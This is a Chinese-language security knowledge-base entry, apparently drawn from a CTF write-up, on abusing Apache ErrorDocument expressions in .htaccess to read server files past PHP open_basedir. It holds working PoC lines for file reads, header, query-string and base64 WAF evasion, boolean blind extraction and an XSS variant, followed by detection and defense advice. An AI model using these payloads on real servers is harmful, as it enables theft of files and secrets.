---
id: web-php-open-basedir-bypass-apache-errordocument-file-read
title: Apache 2.4.13+ ErrorDocument 表达式 %{file:} 读取任意文件（无视 PHP open_basedir）
type: scenario
domain: web
path: web/php/open-basedir-bypass
technique: apache-expression-errordocument-file-read
tags:
- apache
- htaccess
- errordocument
- expression
- file-read
- open-basedir-bypass
- waf-bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: Apache 2.4.13+（原文：该版本起 ErrorDocument 文本参数支持表达式语法）
verification:
  verified_by: verifier-V18
  verified_at: '2026-11-05T02:19:01+08:00'
  notes: 已对照原文与 img 02-04 核对：Apache 2.4.13+ ErrorDocument 文本参数表达式、%{file:/flag} 绕过 open_basedir、PCTF 题目 file_put_contents 写 .htaccess 后访问不存在页读 /love1145141919810、%{req:} / %{QUERY_STRING} / %{unbase64:} / <If> 布尔盲注均与原文一致；affected_versions 按原文 2.4.13+ 标注
url: /docs/web/php/open-basedir-bypass/web-php-open-basedir-bypass-apache-errordocument-file-read/
draft: false
kb_aliases:
- ErrorDocument 404 %{file:/flag}
- Apache 表达式注入
- '%{file:} 任意文件读取'
- '%{req:} 绕过 WAF'
- '%{unbase64:}'
- ErrorDocument 盲注
---

## 一句话结论

Apache 2.4.13 起 `ErrorDocument` 的文本参数支持表达式语法，写入 `.htaccess` 的 `ErrorDocument 404 "%{file:/flag}"` 会在触发 404 时由 Apache 自身读取并返回该文件；整个读取不经过 PHP，因此 PHP 的 `open_basedir`、`disable_functions` 完全拦不住。

## 原理

- `ErrorDocument` 的第二个参数既可以是以 `/` 或 URL 开头的跳转目标，也可以是一段文本。2.4.13+ 开始，文本参数里的 `%{...}` 会被当作 Apache 表达式求值，求值结果替换到错误页响应体。
- Apache 表达式内置 `file` 函数：`%{file:/path}` 读取服务器本地文件。它由 Apache 进程以自己的权限打开文件，不进入 PHP 解释器，因此 PHP 层的 `open_basedir`、`disable_functions`、`base64_decode` 禁用等限制都不适用；只要 Apache 用户有读权限即可。
- 同一套表达式还能调用 `%{req:HeaderName}` 读取请求头、`%{env:}`/`%{osenv:}` 读取环境变量、`%{unbase64:}` 解码、`%{tolower:}`/`%{toupper:}` 改大小写、`%{sha1:}`/`%{md5:}` 计算哈希，便于在 WAF 只检查 URL/Body 时把 payload 藏到 Header 或做关键字变形。
- 表达式支持嵌套：`%{file:%{req:X-Target-File}}` 先用请求头求值出路径，再交给 `file` 读取。于是 `.htaccess` 里可以完全不出现敏感文件名，绕过对配置内容的静态检测。
- 无回显时可用 `<If>` 把文件内容与正则比较，再让两个分支返回不同 `ErrorDocument`，构成布尔盲注；逐字符猜解即可读出文件。

## 触发条件

- Apache 2.4.13 或更高版本，且目标目录的 `AllowOverride` 允许 `FileInfo`/`All`，使 `.htaccess` 可被读取。
- 攻击者可写入 `.htaccess`（上传、任意文件写、配置注入等），无需上传 PHP 文件。
- 攻击者能请求一个不存在的路径触发 404（或其他被 `ErrorDocument` 覆盖的错误码）。
- Apache 运行用户对目标文件有读权限；通常配置文件 `/flag`、源码、`/etc/passwd` 等满足。

## 利用步骤

1. 上传/写入 `.htaccess`，用 `ErrorDocument` 把某个错误码的响应体设为表达式读取目标文件。
2. 请求一个不存在的路径触发该错误码。
3. 从响应体中读取文件内容；若内容被 WAF 或输出过滤，把路径改放请求头或查询串。
4. 若响应只返回固定文本，改用 `<If>` 正则比较做布尔盲注，逐位猜解。

## PoC

直接读取：

```apache
ErrorDocument 404 "%{file:/flag}"
```

```bash
curl -s 'http://target/non_existent_page'
```

把路径藏在请求头（`.htaccess` 中不出现 `/flag`）：

```apache
ErrorDocument 404 "%{file:%{req:X-Target-File}}"
```

```http
GET /non_existent HTTP/1.1
Host: target
X-Target-File: /flag
```

把路径藏在查询串：

```apache
ErrorDocument 404 %{file:%{QUERY_STRING}}
```

```bash
curl -s 'http://target/non_existent?/var/www/html/index.php'
```

Base64 变形绕过关键字过滤：

```apache
ErrorDocument 404 "%{file:%{unbase64:L2ZsYWcudHh0}}"
```

无回显时的布尔盲注：

```apache
<If "%{file:/flag} =~ /^flag{a/">
    ErrorDocument 404 "True"
</If>
<Else>
    ErrorDocument 404 "False"
</Else>
```

逐字符替换正则前缀，根据响应是 `True` 还是 `False` 推进。原文的自动化脚本使用等价的 `file('/path')` 函数形式构造 `<If>` 条件。

## 变体与关联

- 读取来源变体：`%{file:...}` 读文件、`%{req:...}` 读请求头、`%{osenv:PATH}` 读系统环境变量（容器内常含数据库密码/Secret）、`%{env:...}` 读 Apache 环境变量。
- WAF 绕过变体：请求头传路径、查询串传路径、`%{unbase64:}` 解码、`%{tolower:}`/`%{toupper:}` 改大小写、`%{escape:}` 处理特殊字符。
- 同一条 `ErrorDocument` 还可返回 `<script>alert(document.cookie)</script>` 做 XSS，或指向外部 URL 做带外探测；这些属于同一原语的不同落点。
- 关联：[[web-php-file-inclusion-user-ini-auto-prepend-rce]]（有 PHP 执行时的另一条路径）；[[web-generic-file-upload-htaccess-handler-override]]（同为 `.htaccess` 滥用，但目标是解析映射）。
- 边界：Apache < 2.4.13 不支持表达式；`AllowOverride None` 或 `.htaccess` 被过滤时不成立；`%{file:}` 读取受 Apache 进程文件权限限制，读不到仅 root 可读的文件。

## 检测与防御

- 检测：`.htaccess` 中出现 `ErrorDocument` 且参数包含 `%{file:`、`%{req:`、`%{unbase64:`、`<If`；404 响应体出现本不该出现在错误页的文件内容；同一路径被高频请求并伴随自定义 Header。
- 防御：生产环境 `AllowOverride None`；禁止上传点接受 `.htaccess`；对 `.htaccess` 内容做 `ErrorDocument` + 表达式关键字检测；WAF 同时检查 Header 与 Query；以最小权限运行 Apache，敏感文件仅 root 可读；升级到不支持该滥用的配置策略（表达式本身是合法特性，重点在禁止用户可控的 `.htaccess`）。
